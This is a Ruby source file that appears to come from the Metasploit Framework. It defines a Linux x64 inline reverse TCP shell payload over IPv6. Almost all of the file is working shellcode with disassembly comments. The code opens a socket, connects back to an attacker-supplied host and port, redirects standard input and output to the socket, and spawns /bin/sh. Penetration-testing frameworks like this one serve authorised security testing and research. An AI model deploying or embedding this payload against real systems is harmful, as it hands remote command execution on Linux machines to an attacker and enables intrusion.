##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core/handler/reverse_tcp'
require 'msf/base/sessions/command_shell'
require 'msf/base/sessions/command_shell_options'

module MetasploitModule

  CachedSize = 105

  include Msf::Payload::Single
  include Msf::Payload::Linux
  include Msf::Sessions::CommandShellOptions

  def initialize(info = {})
    super(merge_info(info,
      'Name'          => 'Linux x64 Command Shell, Reverse TCP Inline (IPv6)',
      'Description'   => 'Connect back to attacker and spawn a command shell over IPv6',
      'Author'        => 'epi <epibar052[at]gmail.com>',
      'License'       => MSF_LICENSE,
      'Platform'      => 'linux',
      'Arch'          => ARCH_X64,
      'Handler'       => Msf::Handler::ReverseTcp,
      'Session'       => Msf::Sessions::CommandShellUnix,
      'Payload'       =>
        {
          'Offsets' =>
            {
              'LHOST'    => [ 85, 'ADDR6' ],
              'LPORT'    => [ 81, 'n' ],
              'SCOPEID'  => [ 105,  'V' ]
            },
          'Payload' =>
            # <_start>:
            "\x6a\x29"                     +    #   push   0x29
            "\x58"                         +    #   pop    rax
            "\x6a\x0a"                     +    #   push   0xa
            "\x5f"                         +    #   pop    rdi
            "\x6a\x01"                     +    #   push   0x1
            "\x5e"                         +    #   pop    rsi
            "\x31\xd2"                     +    #   xor    edx,edx
            "\x0f\x05"                     +    #   syscall
            "\x50"                         +    #   push   rax
            "\x5f"                         +    #   pop    rdi
            "\xeb\x37"                     +    #   jmp    401048 <get_address>

            # <populate_sockaddr_in6>:
            "\x5e"                         +    #   pop    rsi

            # <connect_call>:
            "\x6a\x2a"                     +    #   push   0x2a
            "\x58"                         +    #   pop    rax
            "\x6a\x1c"                     +    #   push   0x1c
            "\x5a"                         +    #   pop    rdx
            "\x0f\x05"                     +    #   syscall

            # <dup2_calls>:
            "\x6a\x03"                     +    #   push   0x3
            "\x59"                         +    #   pop    rcx
            "\x6a\x02"                     +    #   push   0x2
            "\x5b"                         +    #   pop    rbx

            # <dup2_loop>:
            "\x6a\x21"                     +    #   push   0x21
            "\x58"                         +    #   pop    rax
            "\x89\xde"                     +    #   mov    esi,ebx
            "\x51"                         +    #   push   rcx
            "\x0f\x05"                     +    #   syscall
            "\x59"                         +    #   pop    rcx
            "\x48\xff\xcb"                 +    #   dec    rbx
            "\xe2\xf2"                     +    #   loop   40101e <dup2_loop>

            # <exec_call>:
            "\x31\xd2"                     + 	#   xor    edx,edx
            "\x52"                   	   +    #   push   rdx
            "\x48\xbb\x2f\x62\x69\x6e\x2f" +	#   movabs rbx,0x68732f2f6e69622f
            "\x2f\x73\x68"                 +
            "\x53"                   	   +    #   push   rbx
            "\x54"                   	   +    #   push   rsp
            "\x5f"                   	   +    #   pop    rdi
            "\x52"                   	   +    #   push   rdx
            "\x57"                   	   +    #   push   rdi
            "\x54"                   	   +    #   push   rsp
            "\x5e"                   	   +    #   pop    rsi
            "\x48\x8d\x42\x3b"             +    #   lea    rax,[rdx+0x3b]
            "\x0f\x05"                	   +    #   syscall

            # <get_address>:
            "\xe8\xc4\xff\xff\xff"         +    #   call   40100f <populate_sockaddr_in6>

            # <sockaddr_in6>:
            "\x0a\x00\x11\x5c"             +    #   sin6_family : sin6_port
            "\x00\x00\x00\x00"             +    #   sin6_flowinfo
            "\x00\x00\x00\x00"             +    #   sockaddr_in6
            "\x00\x00\x00\x00"             +    #   ...
            "\x00\x00\x00\x00"             +    #   ...
            "\x00\x00\x00\x00"             +    #   16 bytes
            "\x00\x00\x00\x00"                  #   sin6_scope_id
        }
      ))
      register_options([
         OptInt.new('SCOPEID', [false, "IPv6 scope ID, for link-local addresses", 0])
      ])
  end
end
